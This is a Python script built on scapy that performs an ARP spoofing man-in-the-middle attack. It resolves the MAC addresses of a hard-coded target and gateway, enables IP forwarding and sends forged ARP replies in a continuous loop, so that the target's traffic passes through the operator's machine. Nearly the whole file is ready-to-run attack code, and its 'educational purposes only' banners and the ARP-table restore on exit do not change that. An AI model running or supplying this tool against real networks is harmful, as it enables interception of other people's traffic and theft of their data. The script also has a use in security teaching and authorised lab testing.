#!/usr/bin/env python3
"""
========================================
ARP SPOOFING ATTACK
========================================
This script performs ARP spoofing to position yourself as a
Man-in-the-Middle between a target and the gateway.

HOW IT WORKS:
1. Sends fake ARP replies to the victim
2. Tells victim: "I am the gateway" (but it's actually us!)
3. Sends fake ARP replies to the gateway
4. Tells gateway: "I am the victim" (but it's actually us!)
5. Result: All traffic flows through us!

‚ö†Ô∏è EDUCATIONAL PURPOSES ONLY ‚ö†Ô∏è
========================================
"""

from scapy.all import ARP, Ether, send, get_if_hwaddr
import time
import sys
import os

# ========================================
# CONFIGURATION
# ========================================
# These should be on the same network as you!
TARGET_IP = "192.168.1.100"     # Victim's IP
GATEWAY_IP = "192.168.1.1"      # Router's IP
INTERFACE = "eth0"              # Your network interface

# ========================================
# STEP 1: GET OUR MAC ADDRESS
# ========================================
def get_our_mac(interface):
    """
    Get the MAC address of our network interface.
    We need this to impersonate other devices.

    Args:
        interface: Network interface name (e.g., 'eth0', 'wlan0')

    Returns:
        str: Our MAC address
    """
    try:
        mac = get_if_hwaddr(interface)
        print(f"[+] Our MAC address on {interface}: {mac}")
        return mac
    except Exception as e:
        print(f"[-] Error getting MAC address: {e}")
        print(f"[-] Make sure '{interface}' is a valid interface")
        sys.exit(1)

# ========================================
# STEP 2: ENABLE IP FORWARDING
# ========================================
def enable_ip_forwarding():
    """
    Enable IP forwarding so packets can flow through us.
    Without this, packets would be dropped and the connection breaks.

    Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
    Windows: Requires different configuration
    """
    print("\n[*] Enabling IP forwarding...")

    if sys.platform.startswith('linux'):
        # Linux
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            print("[+] IP forwarding enabled (Linux)")
        except PermissionError:
            print("[-] Error: Need root/sudo to enable IP forwarding")
            sys.exit(1)
    elif sys.platform == 'darwin':
        # macOS
        os.system('sudo sysctl -w net.inet.ip.forwarding=1')
        print("[+] IP forwarding enabled (macOS)")
    elif sys.platform == 'win32':
        # Windows
        print("[!] On Windows, IP forwarding is usually enabled by default")
        print("[!] If not working, enable 'IP Routing' in registry")
    else:
        print("[!] Unknown platform - you may need to enable IP forwarding manually")

# ========================================
# STEP 3: RESTORE ARP TABLES (Cleanup)
# ========================================
def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Restore the correct ARP mappings when we're done.
    This is important for ethical reasons - we don't want to
    permanently break the victim's network!

    Args:
        target_ip: Victim's IP address
        gateway_ip: Router's IP address
        target_mac: Victim's real MAC address
        gateway_mac: Router's real MAC address
    """
    print("\n[*] Restoring ARP tables...")

    # Tell the target the correct gateway MAC
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)

    # Tell the gateway the correct target MAC
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)

    print("[+] ARP tables restored")

# ========================================
# STEP 4: GET MAC ADDRESS FROM IP
# ========================================
def get_mac(ip):
    """
    Get the MAC address associated with an IP address.
    We do this by sending an ARP request and waiting for a reply.

    Args:
        ip: Target IP address

    Returns:
        str: MAC address or None if not found
    """
    from scapy.all import srp

    print(f"[*] Resolving MAC address for {ip}...")

    # Create ARP request packet
    # "Who has IP address X? Tell me!"
    arp_request = ARP(pdst=ip)

    # Create Ethernet frame with broadcast destination
    # ff:ff:ff:ff:ff:ff means "send to everyone on the network"
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combine them
    arp_request_broadcast = broadcast / arp_request

    # Send packet and capture response
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        # We got a response!
        mac = answered_list[0][1].hwsrc
        print(f"[+] Found MAC for {ip}: {mac}")
        return mac
    else:
        print(f"[-] Could not find MAC for {ip}")
        print(f"[-] Is {ip} online and on the same network?")
        return None

# ========================================
# STEP 5: PERFORM ARP SPOOFING
# ========================================
def arp_spoof(target_ip, gateway_ip):
    """
    Main ARP spoofing function.

    How it works:
    1. Send ARP reply to victim: "Gateway is at [OUR_MAC]"
    2. Send ARP reply to gateway: "Victim is at [OUR_MAC]"
    3. Repeat continuously to maintain the poisoned cache

    Args:
        target_ip: Victim's IP
        gateway_ip: Router's IP
    """
    # ========================================
    # CREATE POISONED ARP PACKETS
    # ========================================

    # Packet 1: Tell the VICTIM that we are the GATEWAY
    # op=2 means "ARP reply"
    # pdst = destination IP (victim)
    # psrc = source IP (we claim to be the gateway)
    # hwsrc = source MAC (our MAC - but victim thinks it's the gateway's MAC!)
    victim_packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                        psrc=gateway_ip)

    # Packet 2: Tell the GATEWAY that we are the VICTIM
    gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                         psrc=target_ip)

    # ========================================
    # SEND PACKETS IN A LOOP
    # ========================================
    print(f"\n[*] Starting ARP spoofing...")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Gateway: {gateway_ip}")
    print(f"[*] Press Ctrl+C to stop\n")

    packets_sent = 0

    try:
        while True:
            # Send poisoned ARP to victim
            send(victim_packet, verbose=False)

            # Send poisoned ARP to gateway
            send(gateway_packet, verbose=False)

            packets_sent += 2

            # Status update every 10 packets
            if packets_sent % 10 == 0:
                print(f"[+] Sent {packets_sent} ARP packets", end='\r')

            # Wait 2 seconds before next round
            # (ARP cache typically expires after a few minutes)
            time.sleep(2)

    except KeyboardInterrupt:
        print(f"\n\n[!] Stopped ARP spoofing")
        print(f"[*] Total packets sent: {packets_sent}")

# ========================================
# MAIN FUNCTION
# ========================================
def main():
    """
    Main execution flow:
    1. Check we're running as root/admin
    2. Enable IP forwarding
    3. Get MAC addresses
    4. Start ARP spoofing
    5. Restore ARP tables on exit
    """

    print("="*60)
    print("üé≠ ARP SPOOFING ATTACK - MITM POSITIONING")
    print("="*60)
    print("[!] Educational purposes only!")
    print("[!] Only use on networks you own or have permission to test")
    print("="*60)

    # ========================================
    # CHECK FOR ROOT/ADMIN PRIVILEGES
    # ========================================
    if os.geteuid() != 0:
        print("\n[-] This script requires root/administrator privileges")
        print("[-] Run with: sudo python3 arp_spoof.py")
        sys.exit(1)

    # ========================================
    # CONFIGURATION
    # ========================================
    print(f"\n[*] Configuration:")
    print(f"    Target IP:  {TARGET_IP}")
    print(f"    Gateway IP: {GATEWAY_IP}")
    print(f"    Interface:  {INTERFACE}")

    # ========================================
    # GET MAC ADDRESSES
    # ========================================
    our_mac = get_our_mac(INTERFACE)
    target_mac = get_mac(TARGET_IP)
    gateway_mac = get_mac(GATEWAY_IP)

    if not target_mac or not gateway_mac:
        print("\n[-] Failed to resolve MAC addresses")
        print("[-] Make sure target and gateway are online")
        sys.exit(1)

    # ========================================
    # ENABLE PACKET FORWARDING
    # ========================================
    enable_ip_forwarding()

    # ========================================
    # START ARP SPOOFING
    # ========================================
    try:
        arp_spoof(TARGET_IP, GATEWAY_IP)
    finally:
        # ========================================
        # CLEANUP: RESTORE ARP TABLES
        # ========================================
        restore_arp(TARGET_IP, GATEWAY_IP, target_mac, gateway_mac)
        print("\n[+] Attack stopped and ARP tables restored")

if __name__ == "__main__":
    # ========================================
    # DISPLAY WARNING
    # ========================================
    print("\n" + "‚ö†Ô∏è "*20)
    print("WARNING: ARP Spoofing is ILLEGAL on networks you don't own!")
    print("This tool is for EDUCATIONAL purposes in controlled labs only!")
    print("‚ö†Ô∏è "*20 + "\n")

    response = input("Do you understand and want to continue? (yes/no): ")
    if response.lower() != 'yes':
        print("Exiting...")
        sys.exit(0)

    main()
